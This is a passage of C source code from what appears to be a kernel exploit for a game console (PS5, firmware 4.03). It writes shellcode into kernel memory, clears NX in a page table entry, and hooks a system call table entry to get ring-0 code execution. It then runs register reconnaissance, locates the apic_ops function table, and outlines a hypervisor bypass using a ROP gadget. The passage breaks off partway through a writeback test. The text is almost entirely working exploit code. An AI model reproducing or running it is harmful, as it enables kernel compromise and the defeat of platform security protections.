            r0_shellcode[sc_len++] = 0x10;

            /* xor eax, eax */
            r0_shellcode[sc_len++] = 0x31;
            r0_shellcode[sc_len++] = 0xC0;

            /* ret */
            r0_shellcode[sc_len++] = 0xC3;

            printf("\n[*] Step 1: Writing %d-byte shellcode to kdata via DMAP...\n",
                   sc_len);

            /* Save original bytes */
            uint8_t r0_backup[64];
            kernel_copyout(g_dmap_base + target_pa, r0_backup, sc_len);

            /* Write shellcode */
            kernel_copyin(r0_shellcode, g_dmap_base + target_pa, sc_len);

            /* Verify */
            uint8_t r0_verify[32];
            kernel_copyout(g_dmap_base + target_pa, r0_verify, sc_len);
            int sc_match = (memcmp(r0_shellcode, r0_verify, sc_len) == 0);
            printf("    Write verify: %s\n", sc_match ? "OK" : "MISMATCH");
            printf("    Bytes: ");
            for (int i = 0; i < sc_len; i++) printf("%02x ", r0_verify[i]);
            printf("\n");
            fflush(stdout);

            if (!sc_match) {
                printf("[-] Shellcode write failed, aborting.\n");
                kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);
                goto r0_skip;
            }

            /* Step 2: Clear NX (bit 63) and G (bit 8) in guest PTE.
             * Clearing G ensures the TLB entry (if cached) will be
             * flushed on the next CR3 reload (context switch). */
            printf("[*] Step 2: Clearing NX+G in guest PTE...\n");
            uint64_t new_pte = orig_pte & ~((1ULL << 63) | (1ULL << 8));
            printf("    Old PTE: 0x%016lx (NX=%d G=%d)\n",
                   (unsigned long)orig_pte,
                   (int)(orig_pte >> 63), (int)((orig_pte >> 8) & 1));
            printf("    New PTE: 0x%016lx (NX=%d G=%d)\n",
                   (unsigned long)new_pte,
                   (int)(new_pte >> 63), (int)((new_pte >> 8) & 1));

            kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);

            /* Verify PTE write */
            uint64_t pte_rb;
            kernel_copyout(g_dmap_base + pte_pa, &pte_rb, 8);
            printf("    PTE readback: 0x%016lx [%s]\n",
                   (unsigned long)pte_rb,
                   pte_rb == new_pte ? "OK" : "MISMATCH");
            fflush(stdout);

            if (pte_rb != new_pte) {
                printf("[-] PTE write failed, restoring and aborting.\n");
                kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
                kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);
                goto r0_skip;
            }

            /* Step 3: Clear shared buffer to detect fresh writes */
            printf("[*] Step 3: Clearing shared buffer...\n");
            uint64_t zero = 0;
            kernel_copyin(&zero, g_dmap_base + cpu_pa, 8);

            /* Step 4: Hook sysent[253] to kdata_base and call */
            printf("[*] Step 4: Hooking sysent[253] → kdata_base (0x%lx)...\n",
                   (unsigned long)target_kva);
            fflush(stdout);

            /* Save original sysent[253] */
            uint64_t s253_kva = sysent_kva + 253ULL * SYSENT_STRIDE;
            uint64_t s253_pa = va_to_pa_quiet(s253_kva);
            uint8_t s253_orig[SYSENT_STRIDE];
            kernel_copyout(g_dmap_base + s253_pa, s253_orig, SYSENT_STRIDE);

            /* Write target_kva into sysent[253].sy_call */
            uint64_t s253_call_pa = va_to_pa_quiet(s253_kva + 8);
            kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);

            /* Set narg=0 */
            int32_t narg_zero = 0;
            uint64_t s253_narg_pa = va_to_pa_quiet(s253_kva);
            kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);

            /* Verify hook */
            uint64_t hook_rb;
            kernel_copyout(g_dmap_base + s253_call_pa, &hook_rb, 8);
            printf("    sysent[253].sy_call = 0x%lx [%s]\n",
                   (unsigned long)hook_rb,
                   hook_rb == target_kva ? "OK" : "MISMATCH");
            fflush(stdout);

            /* CALL THE HOOKED SYSCALL — this is the ring-0 moment */
            printf("[*] Calling syscall(253) — executing shellcode in ring 0...\n");
            fflush(stdout);
            errno = 0;
            long r0_ret = syscall(253);
            int r0_err = errno;
            printf("    syscall(253) returned: %ld, errno=%d\n",
                   r0_ret, r0_err);

            /* Step 5: IMMEDIATELY restore everything */
            printf("[*] Step 5: Restoring PTE, sysent, code cave...\n");

            /* Restore sysent[253] */
            kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);

            /* Restore PTE (put NX+G back) */
            kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);

            /* Restore kdata content */
            kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);

            printf("    All restored.\n");
            fflush(stdout);

            /* Step 6: Check shared buffer for magic */
            uint64_t buf_check;
            kernel_copyout(g_dmap_base + cpu_pa, &buf_check, 8);
            printf("\n[*] Shared buffer value: 0x%016lx\n",
                   (unsigned long)buf_check);

            if (buf_check == sc_magic) {
                printf("[+] ============================================\n");
                printf("[+]  RING-0 CODE EXECUTION CONFIRMED!\n");
                printf("[+] ============================================\n");
                printf("[+] Shellcode wrote magic 0x%lx to shared buffer.\n",
                       (unsigned long)sc_magic);
                printf("[+] Attack chain: PTE NX-clear + sysent hook → ring 0\n");
                printf("[+] We have arbitrary kernel code execution.\n");

                /* ─── Phase 2: MSR/CR Reconnaissance via ring-0 ─── */
                printf("\n=============================================\n");
                printf("  Ring-0 Phase 2: MSR/CR Reconnaissance\n");
                printf("=============================================\n\n");
                fflush(stdout);

                /* Build the MSR recon shellcode */
                uint8_t msr_sc[512];
                int msr_sc_len = build_ring0_msr_shellcode(msr_sc, sizeof(msr_sc),
                                                           result_kva);
                printf("[*] MSR recon shellcode: %d bytes\n", msr_sc_len);

                if (msr_sc_len <= 0 || msr_sc_len > 480) {
                    printf("[-] Shellcode too large or failed to build.\n");
                } else {
                    /* Clear the shared buffer for fresh results */
                    uint8_t zero_buf[256];
                    memset(zero_buf, 0, sizeof(zero_buf));
                    for (int zb = 0; zb < KMOD_RESULT_ALLOC_SIZE; zb += 256)
                        kernel_copyin(zero_buf, g_dmap_base + cpu_pa + zb, 256);

                    /* Save original kdata content (larger region for MSR shellcode) */
                    uint8_t msr_backup[512];
                    kernel_copyout(g_dmap_base + target_pa, msr_backup, msr_sc_len);

                    /* Write MSR shellcode to kdata code cave */
                    printf("[*] Writing MSR shellcode to kdata code cave...\n");
                    kernel_copyin(msr_sc, g_dmap_base + target_pa, msr_sc_len);

                    /* Verify write */
                    uint8_t msr_verify[512];
                    kernel_copyout(g_dmap_base + target_pa, msr_verify, msr_sc_len);
                    int msr_match = (memcmp(msr_sc, msr_verify, msr_sc_len) == 0);
                    printf("    Write verify: %s\n", msr_match ? "OK" : "MISMATCH");
                    fflush(stdout);

                    if (msr_match) {
                        /* Clear NX+G in PTE again */
                        printf("[*] Clearing NX+G in PTE for MSR shellcode...\n");
                        kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);

                        /* Hook sysent[253] again */
                        printf("[*] Hooking sysent[253] → kdata_base...\n");
                        kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
                        kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);

                        /* Execute MSR recon in ring 0 */
                        printf("[*] Calling syscall(253) — MSR/CR recon in ring 0...\n");
                        fflush(stdout);
                        errno = 0;
                        long msr_ret = syscall(253);
                        int msr_err = errno;
                        printf("    syscall(253) returned: %ld, errno=%d\n",
                               msr_ret, msr_err);

                        /* Restore everything immediately */
                        printf("[*] Restoring PTE, sysent, code cave...\n");
                        kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
                        kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
                        kernel_copyin(msr_backup, g_dmap_base + target_pa, msr_sc_len);
                        printf("    All restored.\n");
                        fflush(stdout);

                        /* Parse results from shared buffer */
                        struct kmod_result_buf msr_results;
                        memcpy(&msr_results, result_vaddr, sizeof(msr_results));

                        if (msr_results.magic == KMOD_MAGIC &&
                            msr_results.status == KMOD_STATUS_DONE) {
                            printf("\n[+] ============================================\n");
                            printf("[+]  MSR/CR RECON COMPLETE — %u entries\n",
                                   msr_results.num_msr_results);
                            printf("[+] ============================================\n\n");

                            for (uint32_t mi = 0;
                                 mi < msr_results.num_msr_results && mi < 32;
                                 mi++) {
                                uint32_t mid = msr_results.msr_results[mi].msr_id;
                                uint64_t mval = msr_results.msr_results[mi].value;
                                const char *mname;
                                switch (mid) {
                                    case 0xC0000080: mname = "EFER"; break;
                                    case 0xC0000081: mname = "STAR"; break;
                                    case 0xC0000082: mname = "LSTAR"; break;
                                    case 0xC0000084: mname = "SFMASK"; break;
                                    case 0xC0000100: mname = "FS_BASE"; break;
                                    case 0xC0000101: mname = "GS_BASE"; break;
                                    case 0xC0000102: mname = "KGS_BASE"; break;
                                    case 0xC0000103: mname = "TSC_AUX"; break;
                                    case 0x0000001B: mname = "APIC_BASE"; break;
                                    case 0xFFFF0000: mname = "CR0"; break;
                                    case 0xFFFF0003: mname = "CR3"; break;
                                    case 0xFFFF0004: mname = "CR4"; break;
                                    default: mname = "???"; break;
                                }
                                printf("    %-12s (0x%08x) = 0x%016lx\n",
                                       mname, mid, (unsigned long)mval);

                                /* Decode important registers */
                                if (mid == 0xC0000080) { /* EFER */
                                    printf("      SCE=%d LME=%d LMA=%d NXE=%d SVME=%d "
                                           "LMSLE=%d FFXSR=%d TCE=%d\n",
                                           (int)(mval & 1),
                                           (int)((mval >> 8) & 1),
                                           (int)((mval >> 10) & 1),
                                           (int)((mval >> 11) & 1),
                                           (int)((mval >> 12) & 1),
                                           (int)((mval >> 13) & 1),
                                           (int)((mval >> 14) & 1),
                                           (int)((mval >> 15) & 1));
                                    if (mval & (1ULL << 12))
                                        printf("      [!] SVME=1 — SVM enabled in guest!\n");
                                    else
                                        printf("      [*] SVME=0 — SVM disabled (expected in guest)\n");
                                }
                                if (mid == 0xC0000082) { /* LSTAR */
                                    printf("      Syscall entry point (ring 0)\n");
                                    if (g_ktext_base && mval >= g_ktext_base &&
                                        mval < g_ktext_base + 0x1000000)
                                        printf("      ktext offset: +0x%lx\n",
                                               (unsigned long)(mval - g_ktext_base));
                                }
                                if (mid == 0x1B) { /* APIC_BASE */
                                    printf("      APIC PA=0x%lx BSP=%d EN=%d EXTD=%d\n",
                                           (unsigned long)(mval & 0xFFFFF000ULL),
                                           (int)((mval >> 8) & 1),
                                           (int)((mval >> 11) & 1),
                                           (int)((mval >> 10) & 1));
                                }
                                if (mid == 0xFFFF0000) { /* CR0 */
                                    printf("      PE=%d MP=%d EM=%d TS=%d ET=%d "
                                           "NE=%d WP=%d AM=%d NW=%d CD=%d PG=%d\n",
                                           (int)(mval & 1),
                                           (int)((mval >> 1) & 1),
                                           (int)((mval >> 2) & 1),
                                           (int)((mval >> 3) & 1),
                                           (int)((mval >> 4) & 1),
                                           (int)((mval >> 5) & 1),
                                           (int)((mval >> 16) & 1),
                                           (int)((mval >> 18) & 1),
                                           (int)((mval >> 29) & 1),
                                           (int)((mval >> 30) & 1),
                                           (int)((mval >> 31) & 1));
                                }
                                if (mid == 0xFFFF0004) { /* CR4 */
                                    printf("      VME=%d PVI=%d TSD=%d DE=%d "
                                           "PSE=%d PAE=%d MCE=%d PGE=%d\n",
                                           (int)(mval & 1),
                                           (int)((mval >> 1) & 1),
                                           (int)((mval >> 2) & 1),
                                           (int)((mval >> 3) & 1),
                                           (int)((mval >> 4) & 1),
                                           (int)((mval >> 5) & 1),
                                           (int)((mval >> 6) & 1),
                                           (int)((mval >> 7) & 1));
                                    printf("      OSFXSR=%d OSXMMEX=%d UMIP=%d "
                                           "FSGSBASE=%d PCIDE=%d OSXSAVE=%d SMEP=%d SMAP=%d\n",
                                           (int)((mval >> 9) & 1),
                                           (int)((mval >> 10) & 1),
                                           (int)((mval >> 11) & 1),
                                           (int)((mval >> 16) & 1),
                                           (int)((mval >> 17) & 1),
                                           (int)((mval >> 18) & 1),
                                           (int)((mval >> 20) & 1),
                                           (int)((mval >> 21) & 1));
                                }
                            }
                            printf("\n");
                        } else if (msr_results.magic == KMOD_MAGIC) {
                            printf("[?] MSR recon started but didn't complete "
                                   "(status=%u)\n", msr_results.status);
                            printf("    Likely #GP on an MSR read — HV intercept.\n");
                        } else {
                            printf("[-] MSR shellcode did not write magic.\n");
                            if (msr_err != 0)
                                printf("    errno=%d — possible #GP fault.\n", msr_err);
                        }
                    } else {
                        /* Write failed — restore kdata */
                        printf("[-] MSR shellcode write verify failed.\n");
                        kernel_copyin(msr_backup, g_dmap_base + target_pa, msr_sc_len);
                    }
                }

                /* ─── Phase 3: Scan kdata for apic_ops vtable ─── */
                printf("=============================================\n");
                printf("  Ring-0 Phase 3: APIC Ops Discovery\n");
                printf("=============================================\n\n");

                /*
                 * ktext pointer range for validation.
                 * Use 32MB from ktext_base — some LAPIC functions are
                 * in late sections beyond the ktext→kdata gap (~12MB).
                 * The other research branch (apic-ops-summary) confirmed
                 * 32MB is needed to capture all 28 apic_ops pointers.
                 */
                uint64_t ktext_size = 0x2000000; /* 32MB */

                /*
                 * Known apic_ops offset on FW 4.03 (from apic-ops-summary
                 * research branch): kdata+0x170650, 28 entries.
                 */
                #define APIC_OPS_KNOWN_OFFSET  0x170650
                #define APIC_OPS_KNOWN_COUNT   28

                printf("[*] Scanning kdata for function pointer tables (apic_ops)...\n");
                printf("[*] Looking for clusters of 4+ consecutive ktext pointers.\n");
                printf("    ktext ptr range: 0x%lx — 0x%lx (%luMB)\n",
                       (unsigned long)g_ktext_base,
                       (unsigned long)(g_ktext_base + ktext_size),
                       (unsigned long)(ktext_size >> 20));

                /*
                 * Scan 8MB of kdata.  ALLPROC is at kdata+0x27EDCB8 (~40MB)
                 * in BSS; .data (where apic_ops lives) is before BSS.  8MB
                 * should cover the initialized .data section.
                 */
                #define APIC_SCAN_SIZE   0x800000  /* 8MB of kdata */
                #define APIC_SCAN_CHUNK  0x1000    /* 4KB at a time */
                #define APIC_MIN_RUN     4         /* Minimum consecutive ptrs */

                printf("    kdata scan: 0x%lx — 0x%lx (%dMB)\n",
                       (unsigned long)g_kdata_base,
                       (unsigned long)(g_kdata_base + APIC_SCAN_SIZE),
                       APIC_SCAN_SIZE >> 20);
                fflush(stdout);

                int apic_found_tables = 0;
                int apic_run_len = 0;
                uint64_t apic_run_start = 0;
                uint64_t apic_best_addr = 0;
                int apic_best_len = 0;

                /*
                 * Track best apic_ops candidate using a composite score.
                 * Real apic_ops has:
                 *   - ~28 entries (Sony trimmed 3 from FreeBSD's 31)
                 *   - Functions from a single .c file (local_apic.c),
                 *     so all pointers cluster within ~8-32KB
                 *   - Mostly unique pointers (each APIC op is distinct)
                 *
                 * Trampoline/stub tables: span < 1KB (32-byte spacing)
                 * VOP tables: span > 1MB (wrappers + real funcs mixed)
                 */
                uint64_t apic_ops_addr = 0;
                int apic_ops_len = 0;
                int apic_ops_score = 0;  /* composite score */

                /* ── Direct check at known FW 4.03 offset first ── */
                {
                    uint64_t known_kva = g_kdata_base + APIC_OPS_KNOWN_OFFSET;
                    uint64_t known_pa = va_to_pa_quiet(known_kva);
                    printf("\n[*] Direct check at known offset kdata+0x%x...\n",
                           APIC_OPS_KNOWN_OFFSET);
                    if (known_pa && known_pa < MAX_SAFE_PA) {
                        uint64_t known_ptrs[40];
                        kernel_copyout(g_dmap_base + known_pa, known_ptrs,
                                       sizeof(known_ptrs));
                        int known_run = 0;
                        for (int ki = 0; ki < 40; ki++) {
                            if (known_ptrs[ki] >= g_ktext_base &&
                                known_ptrs[ki] < g_ktext_base + ktext_size &&
                                (known_ptrs[ki] & 0x3) == 0) {
                                known_run++;
                            } else {
                                break;
                            }
                        }
                        printf("    Found %d consecutive ktext ptrs at known offset\n",
                               known_run);
                        if (known_run >= 20) {
                            printf("[+] CONFIRMED: apic_ops at kdata+0x%x (%d entries)\n",
                                   APIC_OPS_KNOWN_OFFSET, known_run);
                            apic_best_addr = known_kva;
                            apic_best_len = known_run;
                            apic_found_tables++;
                            /* Dump all entries */
                            printf("[*] apic_ops entries:\n");
                            for (int ki = 0; ki < known_run && ki < 40; ki++) {
                                printf("    [%2d] 0x%016lx  (ktext+0x%lx)\n",
                                       ki, (unsigned long)known_ptrs[ki],
                                       (unsigned long)(known_ptrs[ki] - g_ktext_base));
                            }
                            printf("    xapic_mode [2] = 0x%016lx\n",
                                   (unsigned long)known_ptrs[2]);
                        } else {
                            printf("    Only %d ptrs — offset may differ on this boot\n",
                                   known_run);
                        }
                    } else {
                        printf("    Page not mapped at known offset\n");
                    }
                    printf("\n");
                    fflush(stdout);
                }

                /*
                 * Full scan: Read kdata in 4KB chunks via kernel_copyout.
                 * For each 8-byte-aligned qword, check if it's in ktext range.
                 * Track runs of consecutive ktext pointers.
                 * apic_ops has 28 entries on PS5 FW 4.03 (Sony trimmed 3
                 * from FreeBSD's 31).
                 */
                printf("[*] Full scan for other vtables...\n");

                uint8_t apic_chunk[APIC_SCAN_CHUNK];

                for (uint64_t off = 0; off < APIC_SCAN_SIZE;
                     off += APIC_SCAN_CHUNK) {
                    if ((off & 0xFFFFF) == 0 && off > 0) {
                        printf("    ...scanning kdata+0x%lx (%luMB/%dMB)\r",
                               (unsigned long)off, (unsigned long)(off >> 20),
                               APIC_SCAN_SIZE >> 20);
                        fflush(stdout);
                    }
                    uint64_t scan_kva = g_kdata_base + off;
                    uint64_t scan_pa = va_to_pa_quiet(scan_kva);
                    if (scan_pa == 0 || scan_pa >= MAX_SAFE_PA) {
                        /* Page not mapped — reset run */
                        if (apic_run_len >= APIC_MIN_RUN) {
                            printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
                                   (unsigned long)(apic_run_start - g_kdata_base),
                                   apic_run_len);
                            if (apic_run_len > apic_best_len) {
                                apic_best_len = apic_run_len;
                                apic_best_addr = apic_run_start;
                            }
                            apic_found_tables++;
                            /* Dump entries for apic_ops-sized tables */
                            if (apic_run_len >= 20 && apic_run_len <= 35) {
                                uint64_t tbl_pa2 = va_to_pa_quiet(apic_run_start);
                                if (tbl_pa2 && tbl_pa2 < MAX_SAFE_PA) {
                                    uint64_t tbl_buf[40];
                                    int cnt = apic_run_len;
                                    if (cnt > 40) cnt = 40;
                                    kernel_copyout(g_dmap_base + tbl_pa2,
                                                   tbl_buf, cnt * 8);
                                    int uniq = 0;
                                    uint64_t pmin = tbl_buf[0], pmax = tbl_buf[0];
                                    for (int u = 0; u < cnt; u++) {
                                        if (tbl_buf[u] < pmin) pmin = tbl_buf[u];
                                        if (tbl_buf[u] > pmax) pmax = tbl_buf[u];
                                        int dup = 0;
                                        for (int v = 0; v < u; v++) {
                                            if (tbl_buf[v] == tbl_buf[u]) {
                                                dup = 1; break;
                                            }
                                        }
                                        if (!dup) uniq++;
                                    }
                                    uint64_t spread = pmax - pmin;
                                    printf("      -> %d/%d unique, spread=0x%lx (%luKB)",
                                           uniq, cnt,
                                           (unsigned long)spread,
                                           (unsigned long)(spread >> 10));
                                    int score = 0;
                                    if (cnt >= 26 && cnt <= 30) {
                                        score += 10;
                                        if (cnt == 28) score += 5;
                                        if (spread >= 0x400 && spread <= 0x10000)
                                            score += 20;
                                        else if (spread < 0x400)
                                            score -= 10;
                                        else
                                            score -= 5;
                                        score += uniq;
                                    }
                                    if (score > apic_ops_score) {
                                        apic_ops_addr = apic_run_start;
                                        apic_ops_len = cnt;
                                        apic_ops_score = score;
                                        printf(" [BEST apic_ops candidate]");
                                    }
                                    printf("\n");
                                    for (int di = 0; di < cnt; di++) {
                                        printf("      [%2d] 0x%016lx  (ktext+0x%lx)\n",
                                               di, (unsigned long)tbl_buf[di],
                                               (unsigned long)(tbl_buf[di] - g_ktext_base));
                                    }
                                }
                            }
                        }
                        apic_run_len = 0;
                        continue;
                    }

                    kernel_copyout(g_dmap_base + scan_pa, apic_chunk,
                                   APIC_SCAN_CHUNK);

                    for (int qi = 0; qi < APIC_SCAN_CHUNK; qi += 8) {
                        uint64_t qval;
                        memcpy(&qval, &apic_chunk[qi], 8);

                        int is_ktext_ptr =
                            (qval >= g_ktext_base &&
                             qval < g_ktext_base + ktext_size &&
                             (qval & 0x3) == 0);  /* 4-byte aligned */

                        if (is_ktext_ptr) {
                            if (apic_run_len == 0)
                                apic_run_start = scan_kva + qi;
                            apic_run_len++;
                        } else {
                            if (apic_run_len >= APIC_MIN_RUN) {
                                printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
                                       (unsigned long)(apic_run_start - g_kdata_base),
                                       apic_run_len);
                                if (apic_run_len > apic_best_len) {
                                    apic_best_len = apic_run_len;
                                    apic_best_addr = apic_run_start;
                                }
                                apic_found_tables++;

                                /* Dump entries for apic_ops-sized tables (20-35) */
                                if (apic_run_len >= 20 && apic_run_len <= 35) {
                                    uint64_t tbl_pa = va_to_pa_quiet(apic_run_start);
                                    if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
                                        uint64_t tbl_buf[40];
                                        int cnt = apic_run_len;
                                        if (cnt > 40) cnt = 40;
                                        kernel_copyout(g_dmap_base + tbl_pa,
                                                       tbl_buf, cnt * 8);
                                        /* Count unique pointers and compute spread */
                                        int uniq = 0;
                                        uint64_t pmin = tbl_buf[0], pmax = tbl_buf[0];
                                        for (int u = 0; u < cnt; u++) {
                                            if (tbl_buf[u] < pmin) pmin = tbl_buf[u];
                                            if (tbl_buf[u] > pmax) pmax = tbl_buf[u];
                                            int dup = 0;
                                            for (int v = 0; v < u; v++) {
                                                if (tbl_buf[v] == tbl_buf[u]) {
                                                    dup = 1; break;
                                                }
                                            }
                                            if (!dup) uniq++;
                                        }
                                        uint64_t spread = pmax - pmin;
                                        printf("      -> %d/%d unique, spread=0x%lx (%luKB)",
                                               uniq, cnt,
                                               (unsigned long)spread,
                                               (unsigned long)(spread >> 10));
                                        /*
                                         * Score: prefer 28 entries, 1KB-64KB spread,
                                         * high uniqueness.
                                         * apic_ops: ~28 entries, ~7KB spread, ~27 unique
                                         * Trampolines: ~32B spacing → span < 1KB
                                         * VOP tables: span > 1MB (wrapper + func mix)
                                         */
                                        int score = 0;
                                        if (cnt >= 26 && cnt <= 30) {
                                            score += 10;           /* right size range */
                                            if (cnt == 28) score += 5;  /* exact match */
                                            if (spread >= 0x400 && spread <= 0x10000)
                                                score += 20;  /* 1KB-64KB = single module */
                                            else if (spread < 0x400)
                                                score -= 10; /* too tight = stubs */
                                            else
                                                score -= 5;  /* too wide = VOP */
                                            score += uniq;  /* uniqueness bonus */
                                        }
                                        if (score > apic_ops_score) {
                                            apic_ops_addr = apic_run_start;
                                            apic_ops_len = cnt;
                                            apic_ops_score = score;
                                            printf(" [BEST apic_ops candidate]");
                                        }
                                        printf("\n");
                                        for (int di = 0; di < cnt; di++) {
                                            printf("      [%2d] 0x%016lx  (ktext+0x%lx)\n",
                                                   di, (unsigned long)tbl_buf[di],
                                                   (unsigned long)(tbl_buf[di] - g_ktext_base));
                                        }
                                    }
                                }
                            }
                            apic_run_len = 0;
                        }
                    }
                }
                /* Flush final run */
                if (apic_run_len >= APIC_MIN_RUN) {
                    printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
                           (unsigned long)(apic_run_start - g_kdata_base),
                           apic_run_len);
                    if (apic_run_len > apic_best_len) {
                        apic_best_len = apic_run_len;
                        apic_best_addr = apic_run_start;
                    }
                    apic_found_tables++;
                    /* Dump entries for apic_ops-sized tables */
                    if (apic_run_len >= 20 && apic_run_len <= 35) {
                        uint64_t tbl_pa = va_to_pa_quiet(apic_run_start);
                        if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
                            uint64_t tbl_buf[40];
                            int cnt = apic_run_len;
                            if (cnt > 40) cnt = 40;
                            kernel_copyout(g_dmap_base + tbl_pa,
                                           tbl_buf, cnt * 8);
                            int uniq = 0;
                            uint64_t pmin = tbl_buf[0], pmax = tbl_buf[0];
                            for (int u = 0; u < cnt; u++) {
                                if (tbl_buf[u] < pmin) pmin = tbl_buf[u];
                                if (tbl_buf[u] > pmax) pmax = tbl_buf[u];
                                int dup = 0;
                                for (int v = 0; v < u; v++) {
                                    if (tbl_buf[v] == tbl_buf[u]) {
                                        dup = 1; break;
                                    }
                                }
                                if (!dup) uniq++;
                            }
                            uint64_t spread = pmax - pmin;
                            printf("      -> %d/%d unique, spread=0x%lx (%luKB)",
                                   uniq, cnt,
                                   (unsigned long)spread,
                                   (unsigned long)(spread >> 10));
                            int score = 0;
                            if (cnt >= 26 && cnt <= 30) {
                                score += 10;
                                if (cnt == 28) score += 5;
                                if (spread >= 0x400 && spread <= 0x10000)
                                    score += 20;
                                else if (spread < 0x400)
                                    score -= 10;
                                else
                                    score -= 5;
                                score += uniq;
                            }
                            if (score > apic_ops_score) {
                                apic_ops_addr = apic_run_start;
                                apic_ops_len = cnt;
                                apic_ops_score = score;
                                printf(" [BEST apic_ops candidate]");
                            }
                            printf("\n");
                            for (int di = 0; di < cnt; di++) {
                                printf("      [%2d] 0x%016lx  (ktext+0x%lx)\n",
                                       di, (unsigned long)tbl_buf[di],
                                       (unsigned long)(tbl_buf[di] - g_ktext_base));
                            }
                        }
                    }
                }

                printf("\n[*] Found %d function pointer tables.\n",
                       apic_found_tables);

                if (apic_best_addr) {
                    printf("[+] Largest table: kdata+0x%lx (%d entries)\n",
                           (unsigned long)(apic_best_addr - g_kdata_base),
                           apic_best_len);
                }

                /* Report best apic_ops candidate */
                if (apic_ops_addr) {
                    printf("[+] Best apic_ops candidate: kdata+0x%lx (%d entries, score=%d)\n",
                           (unsigned long)(apic_ops_addr - g_kdata_base),
                           apic_ops_len, apic_ops_score);
                    printf("    xapic_mode slot [2] at kdata+0x%lx\n",
                           (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
                    /* Export to global for Phase 7 */
                    g_apic_ops_addr = apic_ops_addr;
                    g_apic_ops_count = apic_ops_len;
                } else {
                    printf("[!] No apic_ops candidate found (26-30 entries with high uniqueness)\n");
                }

                printf("\n");
                fflush(stdout);

                /* ─── Phase 4: VMMCALL analysis (NO direct probe) ─── */
                /*
                 * DISABLED: Direct VMMCALL probe causes kernel panic.
                 *
                 * The HV intercepts VMMCALL (#VMEXIT) and injects #UD or #GP
                 * back into the guest for unrecognized hypercall numbers.
                 * Without a proper IDT-based fault handler installed first,
                 * any fault in kernel mode → kernel panic.
                 *
                 * Safe VMMCALL probing requires:
                 *   1. Install custom #UD/#GP handlers in IDT (vectors 6, 13)
                 *   2. Set up a recovery trampoline (longjmp-style)
                 *   3. Only then issue VMMCALL
                 *   4. If fault fires, handler recovers; if not, VMMCALL survived
                 *
                 * Alternative: Use the apic_ops suspend/resume path (flatz method)
                 * which executes VMMCALL during a window where the HV is inactive.
                 */
                printf("=============================================\n");
                printf("  Ring-0 Phase 4: VMMCALL Analysis\n");
                printf("=============================================\n\n");
                printf("[*] EFER.SVME=1 confirmed — system runs under AMD SVM HV.\n");
                printf("[!] Direct VMMCALL probe SKIPPED (causes kernel panic).\n");
                printf("    HV injects #UD/#GP for unknown hypercalls.\n");
                printf("    Need IDT fault handler before safe probing.\n\n");
                printf("[*] Safe VMMCALL strategy (TODO):\n");
                printf("    1. Hook IDT vector 6 (#UD) and 13 (#GP)\n");
                printf("    2. Install recovery trampoline in handlers\n");
                printf("    3. Issue VMMCALL with RAX=0..31\n");
                printf("    4. If handler fires → HV rejected; if returns → survived\n\n");
                printf("[*] Alternative: apic_ops suspend/resume path (flatz method)\n");
                printf("    Overwrite apic_ops.xapic_mode (kdata+offset+0x10)\n");
                printf("    with ROP gadget, trigger suspend/resume cycle.\n");
                printf("    Code runs before HV restarts → bypass intercepts.\n");
                if (apic_ops_addr) {
                    printf("[+] apic_ops candidate at kdata+0x%lx (%d entries, score=%d)\n",
                           (unsigned long)(apic_ops_addr - g_kdata_base),
                           apic_ops_len, apic_ops_score);
                    printf("    xapic_mode [2] at 0x%lx (kdata+0x%lx)\n",
                           (unsigned long)(apic_ops_addr + 0x10),
                           (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
                } else if (apic_best_addr) {
                    printf("[?] No 26-30 entry match; largest table at kdata+0x%lx (%d entries)\n",
                           (unsigned long)(apic_best_addr - g_kdata_base),
                           apic_best_len);
                }
                printf("\n");
                fflush(stdout);

                /* ─── Phase 5: apic_ops CFI Writeback Test ─── */
                if (apic_ops_addr) {
                    printf("=============================================\n");
                    printf("  Ring-0 Phase 5: apic_ops Writeback Test\n");
                    printf("=============================================\n\n");
                    printf("[*] Testing if apic_ops function pointers are writable.\n");
                    printf("    apic_ops base: 0x%lx (kdata+0x%lx)\n",
                           (unsigned long)apic_ops_addr,
                           (unsigned long)(apic_ops_addr - g_kdata_base));
                    printf("    xapic_mode [2]: 0x%lx (kdata+0x%lx)\n",
                           (unsigned long)(apic_ops_addr + 0x10),
                           (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
                    fflush(stdout);

                    /*
                     * Compute DMAP addresses for apic_ops slots.
                     * Must use DMAP for ring-0 access — direct kdata VA
                     * causes kernel panic (HV/NPT blocks writes via kdata VA).
                     */
                    uint64_t apic_pa = va_to_pa_quiet(apic_ops_addr);
                    uint64_t slot0_dmap = g_dmap_base + apic_pa;
                    uint64_t slot2_dmap = g_dmap_base + apic_pa + 0x10;
                    printf("    apic_ops PA: 0x%lx\n", (unsigned long)apic_pa);
                    printf("    slot0 DMAP:  0x%lx\n", (unsigned long)slot0_dmap);
                    printf("    slot2 DMAP:  0x%lx\n", (unsigned long)slot2_dmap);
                    fflush(stdout);

                    if (!apic_pa || apic_pa >= MAX_SAFE_PA) {
                        printf("[-] Cannot resolve apic_ops PA (0x%lx) — skipping.\n",
                               (unsigned long)apic_pa);
                    } else {

                    /* Verify DMAP read of apic_ops matches scan results */
                    uint64_t dmap_verify;
                    kernel_copyout(slot2_dmap, &dmap_verify, 8);
                    printf("    DMAP verify slot2: 0x%016lx\n",
                           (unsigned long)dmap_verify);
                    fflush(stdout);

                    /* Build writeback test shellcode */
                    uint8_t wb_sc[512];
